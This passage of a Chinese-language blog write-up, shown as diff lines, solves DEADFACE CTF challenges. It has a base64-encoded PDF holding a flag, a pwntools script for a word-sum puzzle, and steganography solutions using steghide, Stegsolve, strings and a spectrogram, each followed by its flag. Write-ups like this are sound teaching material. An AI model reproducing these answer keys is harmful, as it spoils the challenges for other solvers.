+R3TKqcq5FjAqpXr5pCJgKUDRAQgIFDfgaBqsGUlCU5vzbE4poPr2AqiGFMciJRxQHM1oxERPNNBU
+4TQBFRFAE3ZcqTEGURFQ1mEUHcUndYp16nxNWW5NlFwkyUCLPAuD1RTMVVITQTOI0a4QgGsBdRbw
+qjmAgPC9fyE282cMyZtEm49kc3BF0WdXRRRB5QIBHgpkyCYBE4QOaMIDEbLRNS55Fyqfvb4UIi7r
+PioBhRImUweQ1ICBriimkwjUXYDnyRSICLhA1Yg5MTStEsTzmxICwO0qv6aKw26RQUWULdhSKmU4
+lxcG8uSJdkiXncXmSHpN6TCAGoCIGKI2wGKIAYo7+ANj8z5Zmu7JPMoTjkl7lqUXt4Oc6wu6T2gA
+CMbFcUAKQiIiIwaUm2+uQ1RnZ6mzJ71J0nvqCiT2gslWU6QFOeJQKY5QLEpRt7eLSAJgAqiCoKAK
+CKCeSRalAikIgoaK6ogAoeygUbPlF5GqBKkougwVkpF0fgCAxEEgdgG2GxClHFNJ1U3u9gUdUXM4
+2ncZJGVFBgMBB4MmmmFvbwh0bSAOaco1VZdcFbg8yMKJt+Ok7l9a0UnNeW5FmZOF9nClW3pR1dHV
+3iZJQQQRMQAgKZjAAWwWbNhqFGEaioaYzg7izmoPAgaLwVbqJKiJhouyDDHdMwPJWMJwKTaqWOMp
+O8LUi4oIu8QiAKKWANC7gERxTRUl1LlZakhOXJVlR6vMvaJXhJWkBiJicKSYGiAnEYDZgYIXVs3i
+TvKcak0gCW4gd1pYyVAGsTw6T4XnFIz5IywBIIO7oKpSqEIkBIAKoGIMDGEQuMAGFi2asQZj2I1F
+igaBzQBATnhNcqASMYbRwhOEGogIGoN0li7tTGcMoSo5PkjywoKr/JC9ZOqcRMc5BExQpCNuIGII
+RwkGmBnxNUqb4qeUCELJ6wIPNMipBKoInACAAkATjfs1xjbNVKnd9T4nWdOApWpOFi2iKysPIFo6
+YUhSZLE7ZxKSoiV6TdX1QyaCoU0BOdVYKZiDfJhAAEAiFiItACJ7IKgnsJmF3AQAcmm8iUiAGM4K
+gYxQNB2F63RaFIs7JvTiMdOR30jyomFIycDpKgWwAmoqFIYQiIWYQbvSjOGR5JfXST5QeKy8Sgeg
+6kEihqZolLCJSmKFkwW4g2fy7JzjIFU+QTSMgRzK9AQFU0SgmkNIx0jQKAAARLbwbnVYQB6nFNp2
+ExkwWXOmJyDROUDKoFiA3Q2bDAjJw0HOxBNFFqaioQYxZwFymAcDscVsCqHMsXy0N5VEFQNRiIKA
+jHgwSVuGHpNMygi9vLgujJ7xaV5USMCLxRBUCGG2NRGwLUyf00ZtuUzXxVyk5B2Vc00zIrJEKRaI
+HKW+jwpGiAjGkItOTAeFXmZslKrGpHtKBIjhCGMQvaFBiAHGnAuAgDRI4ByShEUBNFYURQVTNQya
+pVxOpCg/p2onJK74+SgcImVTOWtlEboK4RQwgG/hvwMqVPMqleJZkZ5eTvzjJrwCTsuYRMWIGUKI
+FEREYCBQGEYBi2lJ2TUnRLp1xk+XzOzscABNwFMUk7iAGKZVM4HEojERiUbduxU6ltMwvk1V3BGT
+H2SjiCibtGtKBGgY99CYwjEAiIiMYgwwUxBSMRjDJJtEmzyQ5QF4yCMmjZ5K7MYxhC7L4+Oknux3
+x+WI7oJBE6iggUgBv4tWXqfE1Zbk2UXCTJQIs8C4PVFMxVUhNBM4jRrhCAawF1FoKqwZSUJTm/Ns
+Timg+vYCqIYUxyIlHFAczTs4ZkzaJNx7I5uCLos6uiiiDygQCPBTJkEwCJwgc0YQGI2WpOTYZ5wy
+rGQJKxiCY6dQqjUjzQBWMRbJikBeFUcwEB4Xr+Qm0qvVFmY7Pijg8SiCa6Kp0lCmSeAApyCJTBSr
+VG3C3i0RUfOROZp1FDAQhH14MYxhgUAAqYiIiNsDRsoTvqaPDyuijIIymYTGFV4dnNAKQmjSNSES
+KREbuGHatiDGQBXBqS8qhpis2GEYjb5ya0rCWjOT85Si7le3BdN5QPcVUjAoQYW4RARshdg1CqkT
+4koskvcjyVKKiMrIvKZDERK8InLQNfYUwIUtthDWW8CpW+oFnTLMnyWRZCTFE7UIuzxYUTEpylAB
+CkeAwOIW9kACLS9ViTJNSmo8vqTogR5M8oCK5UyFVETHsiJgLSs3dlqT1DRWOZRQXRZgB2VASrMV
+OBc1EEVkGVHnl3pHqmzORklyRfpTG1KbqiVeki9HNXAIUDxNWhiMbuLT04ZYTc5qvssuqkC2gOq7
+qBEoxULfobIAIWTA3jTdkCQlZAk1RSTnQ5zuDsYxjIJGMIimUREREtkWiKrb2m4TMFySACA9PCDu
+QhQApQKS/sACwABBODSxnODmE5BJRMUOeUMFNkFYDUU0xSBHdAXmzEUlF4mSk+So8KPTw9EeFa4s
+Yyh6IiYpAiN1ArRtRnAUVxILY4k0rJcuzWk6brtJpZYcKTu4EShap3pCYEwAcHt4tCVGXx0vXlnC
+vp2qB8WVF3plr1bopFp0Y0qMbEYQap1GKgoyGgDsBz0VLkYSKrOIi8mvZaGxjGpKoqTVUll/kySH
+N2kp4Udnx9fiJkOkYSHogU1IIhtoxW5VTkzo1P10VDCodO0ZDHMImMYSqJgIiI2REWiZ/vbm8T8m
+5Jz6sR3d3QbVLKKmKmkACekACYwgARrEMW3l1TZwSC/zPe3VxlJ0eVzKO4lSRXRVUEAUIIwKU4jY
+AGpGWaNLMbTGiaD2VTnAGjC05wHDukCts2sB2S8R7r5WVpJoeaL46Pk3JPF0XTXBFzd0la0cqlBQ
+qZKRDURGBgjZAbLTDWjElc63h3ZWbDlQ23Q3RGjXOccjP8qvMiOjxXH5zARXRoKlogAgUb6MQCjZ
+MFsItJNm80dDUnHwWr5Yk1JqZ4GrCYeLyaAIFUckaJy7MaGVCmV2lOccjSM9ujjKTxWV389B2JQV
+PTNEpYRIQwBZMFuIN5y66Dqid4eVCIpJlpHUUMBCFALsREQAAbOqp2BXNThX7Gd2mqqEjStLc2rT
+SQQyyiTyRZVEggBjplKcBAAiFIQEQGF3dWWhGNYHLieca2QAQBHToiUoRmyrMgC8iAihpkALyFqp
+kx0FBSPKhBMFuKaTwqXpREjFHo2m5KlaT5bciSjJatfdlBECKUTkiJRgNg5Sjb4Zszkqc0wJOSRk
+ycM2Qk15TIUqhnl0TeLawJhFQteGI7ZFtJkRSRlZNSVkAEAcD0jJA7FKRKyIiaBSgEBjGIQt2qQQ
+RXQXBQqURSWRWFUqfVnUQLNl3TUKBllH9MEhEAExYFOJhAbqxYa6yWid3kxzd1RidJ1RIYcOUhQH
+tQaq1Vl5ERm4QssIKvIqPRQdSoHBFQqoFMNKkJTgAUYgN8jb212HlzIcJ4OSRxnI9FVdTIp2jdzH
+Ks9I28SqqFRTpmhAIxFoMUPBqeAorJGgk7lJ6pgtDRBBdM5V2K0sYxhC/9HVWMYwhUObkmyihVMl
+5/XdVk3VZAQSeDpnKicYo2CnEAKNsNsLXxjGAkaabShqGnEeeRzHHUscjpgDnFUaps3H+cc3ipSY
+SuvTq8kXKlECicoFMQwBEQCMDRxWFbwJGntPB4Vc5Oe5rPSRhOkm8PZ68mkBYgVRQCnRALazCmLX
+1jDUhFcBEBQbgCBBTQagAgAthTLPJ6SbL0nTxcZ4ydJxpYd3d3BIzsnEyhDBXAiAAU5sHiBgKMBt
+7pvCnS+TunnID0S8IvJbm6gRatqgc728KAYpSkKStkMBQAwmG+boLLagxoQSQWREQbCIo6YVClGM
+gOQTQABbgCWnBUqFJ7vKM8pjvM3X+TV5IXdXZ3QQM9AchVTpAAkOFJIggWKYUoAMItHyDOKf0guK
+M215srvi7sWsoPICYiAFC4AYwEOmIBhaYWOjbRJSO/Jye8nkwhVXwqCgu6Z4AQygANABiYoQjhwa
+imeKs74WtWlcnCuWK6AomEmHz1X8gWkRETjhpZARBQBFNNFYSgAQNNClRFBcQBJJBcC8Gpqk+Jz5
+nAD8oVZ5KQ4PChbBRUFUomAAiNiICANe52CsWbErC7gIqXj3miAW9wN6xo6Yszhmo5rne1wepQfj
+go9LBESxCMCgJoCNkwiIiARjbNZhADAJTBEBCAgNkBBh4ImAYkkw2VEFERR0wIkNFA8T00z0U1UA
+Q06RUapK/SWSaju6FeUQejPC4qIicoK0hMNG+YxslAIN3qpM2JTlp3cZVkMKcoSUuKqaUSgJyiJT
+DClABMBiAIBGyEbuDeehU6mk6SmnKzo5ig8IrAsStqKlTKcBiAgWlAAjdBYaytJwsyByhwCCizKA
+IIPlCg2MUQVNFFVdmEUSzpScc+pzSevIoTfWks6rucjy/K1wCAWiNOtkOmnExoQAAMaEcW0hUukt
+6dZoqOMquqruZV6eAMiuQ6JxIcpAjAwFGA2bLXVjQlGSUrmgA5NEpTjFOVBRDJIFl7i7T1qbvDw5
+yfJxpdkVZYyqQI0hWKI2MEA5ijAAjfAgN01nmxOuXpdlAztKM33mSHcqJjguuKggJwEoAW+0UrcB
+HomtLGAKiMZIAgmqogCKCqBBQWSRFFJT2ESosnydKBKrEpSid1WK5qSeQhHkUzggY1B3CiB4URG+
+RsRummp/Ozy+TQlJ2c0jvCyiRAIkkUyihhpkGAFKAiNgGsDGgQRMAxoagi8iPPKQFA5mbhqIAHOK
+mpzYWlyps6yA8FF1erQo0AWKYhk1k4GKBgEKQWQgNiMBaCk+clUSQpMLN1Sbyz09u6dYdn0oHOiB
+QCBBMJSGIaAXdMMO2nsaRTE4VjxREG7VsKxQAIAaC5gJC+VBsVSqdTVfZuSa8LysIDKUorV54gIG
+EoBGiQTBEBGJjCMLFloypzJkpOM45yrvrou7JPD3SRUWTOmRQK6uMSiYoAYICFs2gMaUYyRrgTUA
+UQS3SBQhGIg1OA5FdEBEeeVAndJkpPNUObz67Oi6zshWq8ummc6ScFTCNIwAJQsYUW6VRJMlJ9nN
+NpdydF3hJ3eqSyiKZ1CJhXUBiYSlEChABt20BjQbGLJXDEOPeTlik6MmauzANylcq/P52eXyaEpO
+zmkd4WUSIBEkimUUMNMgwApQERsA3izXLK0k1PnYEXQ5pRd3NUU3RYpkzipTOJSmKaiIRiGEa1Ma
+FjgBzIJtEEXsi5o0qjqTL40s+GqDPKjWQmc9gvCAHEV6zSwufYAhyLFt5MwJsS45yjKE55ygVN/l
+KwCJRARIUTUhEaIiULYAAIjAAsteGNIJCiugIIthVyZBTSWRAUG4KFFqTomyioZFaV3FNRMwlOQz
+ygUxTAMBAQE8QEBbje2TV2GZP6dO/wAUbwl6nszXldR5Xk0h1VjmUUMJ1oiYwiYw2FMKLcMm2mRs
+Fp40X+KMBFBNUgtij6os3JQl90k+WpvCVd9k1UF0SlMWCiZqJ6RRGwIgJAEAjZCN3BvAUnHPqc0n
+ryKE31pLOq7nI8vytcAgFojTrZDppxMaEAADGhHFtoKCCTsgm7IFoJIkKmmWIjApQApQsxG2Bu40
+CAIHGhKoiKQtRfJgQBGMRcwAAIhk9MsWezJkGVFKnMoSKuiq4vb0Z7ImV4IdE19kKBREDFAaIjYj
+BvBmzLk7ZryWnNu9UeV10DnArwnSIgcxzCakY4JHJYjb07OGbUGNIiiIi1NNAQbGqFAAAGgDQ44Q
+G3lSyeTzTpmzPZ7lN8kh5lRSUUEgeDuhFawkdatqGApgSUAQIIUbe6t2vU95BXnJNt6kt0EpXg1B
+RGkMCiZMwGoiN1EAg08xggiaBtKqILAiiAPAlICgcJzVBFuKCAi8lmkkzvnvIUnO8jPk1Ht8VdEi
+oFXSroEMUgUSREqCxRGAWRA1lrg9SLJk8JKcjzjcDAagVcXY6iqRklDlCkUaBkxEQtrLTbGkRZkW
+ZMRFFF83KABBRIABBAqivUumOVFQU5MvsCGEsF3sRjAYWK80XUmm0SS5NWlWUnJVzlIVVURO8Aqi
+asQTPcDiBYUi28MW2hNxOUpyiQwRKYBAQww2BaAETWYQVE1AEVvCoLYpEAFlAVAORfOyoFF3tk1d
+hmT+nTv8UbqWdU1zGApZYcBMIgAAD0gIiI2wXNo7JtpkbBaeNF/ijdSVOJlEMBySWQDFEBAQUXsC
+FkBz0YCCKahBbKl5EsTHmvLz4MoSs5WoeBIUgnrzwnfJbYIEVKW7wjVOe9TiQHKbrw8TckpQ0oFO
+iCYInenlSAnKB4EFQ8b5jdNpLGgQSQBJNFJ3R05Si1TSXdkNMVdmw4SRNObLuZQCSYRVJFZ7M8qG
+TAF1CEKakKpr5ERAAhYs3TeZe2TV2GZP6dO/xRvLlSSnCWXM8nymiDw7KCUTJiJigIlEDBZKJRtw
+aEybaZGwWnjRf4o1QiJwiIrik7NHgqQAAAAaAm7lLukvyDKC4OzhKTo9LGARBJFdJVQQCyIgUphG
+2agyq5zmmfPd7nLJUlqSw5SmmIHTQA5jlE1ETANAqhiiBiRARKICAwt7a5SXMubEjPhJQkxxK7vB
+AMBVCnVMIAYBKIQMcQthwjTbQoIHAKAgAg8CqGSQKVQEBBEBEBeQUHJlkc7yztlR+kOci8jPAHRX
+MdOTkAO8HTTSMkoAqGKmIlOcY4LYAAsRi13lOc8tusgucruMhvDy8vJgrzhBQFkSwMIiaCYmjEAs
+UbtrKxjlZQSBmRyauTIuAimLKgPOyRZrKc8J2S84LyUSZryQzykZMDvIKmSLSCjSgd3SCIRsX0DW
+Op3N5+m1NwjjKUAeVV1FzplEDgnTAoASICICMCxGFhrOxgJIoAmcAAItgT3ZBTQRcoog7iCBZ1Vi
+fZKeJupO5HlI72m/kEiRDlOoECqFPEAERAAjZw7XuShWNJbmZ4CCouqIqANgQNQLS7VoMlTmaBJS
+NKpnIVXgyxlxrqiqidMxqQmEomgNkbYYg1mYakaICqccAi0BAEEAIcmcAgoaaIA3RFEjGMYQv//S
+1VjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMI
+RjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIX/2Q0K
+ZW5kc3RyZWFtDWVuZG9iag0xIDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCAxNC9M
+ZW5ndGggMTI2L04gMy9UeXBlL09ialN0bT4+c3RyZWFtDQpo3jJTMFAwVzCxVLBQsDRSsLHRd84v
+zStRMNR3yywqLgFKGSgE6fskwpkhlQWp+v6lJTmZeanFdnZADY5ArSCZgMSiVKBOM4iyzJKcVA2n
+nMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh
+bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh
+Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr
+YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl
+IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg
+Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk
+Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg
+ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg
+ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg
+IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg
+ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w
+Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg
+ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl
+YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w
+NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB
+Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg
+ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN
+TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94
+bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi
+LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg
+PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w
+ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4
+bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0
+ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N
+CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0
+cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg
+MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo
+kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+
+odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq
+DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy
+L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC
+MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx
+MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7
+QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0
+eHJlZg0KMTE2DQolJUVPRg0K
+</code></pre>
+<p>在本地解码,保存至<code>flag.pdf</code></p>
+<pre><code class="shell">~$ base64 -d encoded &gt; flag.pdf
+</code></pre>
+<p><strong>flag:</strong><code>flag{deM0nn3_dat4_4_us}</code></p>
+<h1 id="The-Count"><a href="#The-Count" class="headerlink" title="The Count"></a>The Count</h1><p><em>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He’s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as <code>flag{SHA256_hash}</code>.</em></p>
+<p><em><a href="https://ghosttown.deadface.io/t/what-programming-needs-are-there/56/4" target="_blank" rel="noopener">Link to Thread</a></em></p>
+<p><em>code.deadface.io:50000</em></p>
+<hr>
+<p>使用nc命令连接服务器</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ nc code.deadface.io 50000
+DEADFACE gatekeeper: Let us see how good your programming skills are.
+If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:
+
+ You have 5 seconds to give me an answer.
+
+Your word is: tightfisted
+Too slow!! Word has been reset!
+
+</code></pre>
+<p>我们取每一位字符的ASCII码后减去97,求和即可</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+p = remote(<span class="string">'code.deadface.io'</span>, <span class="number">50000</span>)
+
+x = p.recvline_contains(<span class="string">b'Your word'</span>)
+word = x.decode().rsplit(<span class="string">':'</span>)[<span class="number">-1</span>].strip()
+count = sum([ord(x)<span class="number">-97</span> <span class="keyword">for</span> x <span class="keyword">in</span> word])
+p.send(str(count).encode())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+
+
+</code></pre>
+<p><strong>flag:</strong><code>flag{d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944}</code></p>
+<h1 id="Behind-the-Curtain"><a href="#Behind-the-Curtain" class="headerlink" title="Behind the Curtain"></a>Behind the Curtain</h1><p><em>This image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn’t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}.</em></p>
+<p><em><a href="https://tinyurl.com/26fd4pbs" target="_blank" rel="noopener">Link to Image</a></em></p>
+<p><em>SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2</em></p>
+<hr>
+<p>使用<code>Stegsolve</code>打开图片,选择<code>Frame Browser</code>,在Frame 2即可看到flag<br><img data-src="../../CTF/DEADFACECTF/Steganography/images/Behind_the_Curtain.png" alt="Behind the Curtain"></p>
+<p><strong>flag:</strong><code>flag{L3t_m3_in}</code></p>
+<h1 id="Scary-Bunny"><a href="#Scary-Bunny" class="headerlink" title="Scary Bunny"></a>Scary Bunny</h1><p><em>What could be inside this creepy rabbit?</em></p>
+<p><em><a href="https://tinyurl.com/4csyne6s" target="_blank" rel="noopener">Download image</a></em></p>
+<p><em>SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1</em></p>
+<hr>
+<p>使用<code>steghide info</code>查看图片隐写信息</p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ steghide info bunny.jpg
+&quot;bunny.jpg&quot;:
+  format: jpeg
+  capacity: 2.7 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file &quot;steganopayload730241.txt&quot;:
+    size: 13.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+</code></pre>
+<p>使用<code>steghide extract</code>提取隐写的文件<code>steganopayload730241.txt</code></p>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ steghide extract -sf bunny.jpg
+Enter passphrase:
+the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y
+wrote extracted data to &quot;steganopayload730241.txt&quot;.
+
+╭─ ~/CTF/DEADFACE
+╰─$ cat steganopayload730241.txt
+flag{Carr0t}
+</code></pre>
+<p><strong>flag:</strong><code>flag{Carr0t}</code></p>
+<h1 id="Send-in-the-Clowns"><a href="#Send-in-the-Clowns" class="headerlink" title="Send in the Clowns"></a>Send in the Clowns</h1><p><em>There is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}.</em></p>
+<p><em><a href="https://tinyurl.com/y9xjz7b4" target="_blank" rel="noopener">Link to Image</a><br>SHA1: 74eaae618bf508ef2715533bfdff3153dd996e89</em></p>
+<hr>
+<pre><code class="shell">╭─ ~/CTF/DEADFACE
+╰─$ strings steg02.jpg |grep flag
+flag{s3nd_in_the_kl0wns}
+</code></pre>
+<p><strong>flag:</strong><code>flag{s3nd_in_the_kl0wns}</code></p>
+<h1 id="V0icE"><a href="#V0icE" class="headerlink" title="V0icE"></a>V0icE</h1><p><em>A friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can’t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends.</em></p>
+<p><em><a href="https://tinyurl.com/2sa56kbk" target="_blank" rel="noopener">Download file</a></em></p>
+<p><em>SHA1:3173700e9ba2f062a18707b375fac61049310413</em></p>
+<hr>
+<p>用<a href="https://www.sonicvisualiser.org/download.html" target="_blank" rel="noopener">Sonic Visualiser</a>打开<code>midnight.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>-&gt;<code>midnight.wav: All Channels Mixed</code></p>
+<p><img data-src="../../CTF/DEADFACECTF/Steganography/images/V0icE_01.png" alt="V0icE"></p>
+<p>放大后即可看到隐藏在频谱图的flag</p>
+<p><img data-src="../../CTF/DEADFACECTF/Steganography/images/V0icE_02.png" alt="V0icE"></p>
+<p><strong>flag:</strong><code>flag{1257}</code></p>
+<h1 id="A-Warning"><a href="#A-Warning" class="headerlink" title="A Warning"></a>A Warning</h1><p><em>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.</em></p>
+<p><em>One of them says: “Stay away from Lytton Labs… you have been warned.”</em></p>
+<p><em>To find the flag, find the message. You’ll know it when you see it. Submit the flag as <code>flag{flag-goes-here}</code>.</em></p>
